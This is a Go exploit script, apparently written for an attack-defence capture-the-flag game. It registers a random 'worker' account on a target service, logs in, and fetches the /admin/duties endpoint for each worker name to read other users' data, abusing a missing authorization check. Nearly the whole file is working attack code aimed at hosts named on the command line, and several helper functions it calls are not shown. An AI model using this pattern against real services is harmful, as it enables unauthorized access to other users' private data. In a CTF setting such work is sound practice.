package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"strings"
)

type DutiesResponse struct {
	Status string      `json:"status"`
	Data   interface{} `json:"data"`
}

func sploit(host, workerName string) {
	url := fmt.Sprintf("http://%s:22869", host)

	username := generateRandom(32)
	password := generateRandom(32)

	err := register(url, username, password, "worker")
	if err != nil {
		log.Fatalf("Failed to register: %v", err)
	}

	client, err := login(url, username, password)
	if err != nil {
		log.Fatalf("Failed to login: %v", err)
	}

	resp, err := client.Get(url + "/admin/duties?username=" + workerName)
	if err != nil {
		log.Fatalf("Failed to get duties: %v", err)
	}
	defer resp.Body.Close()

	var result DutiesResponse
	body, _ := io.ReadAll(resp.Body)
	if err := json.Unmarshal(body, &result); err != nil {
		log.Fatalf("Failed to parse JSON: %v", err)
	}

	if result.Status == "BAD" {
		log.Fatalf("Failed to sploit: %d - %s", resp.StatusCode, body)
	}

	fmt.Println(string(body))
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: ./sploit <host>")
	}
	host := os.Args[1]

	data, err := AttackData(host)
	if err != nil {
		log.Fatalf("Failed to get attack data: %v", err)
	}

	for _, item := range data {
		worker := strings.Split(item, ":")[0]
		sploit(host, worker)
	}
}
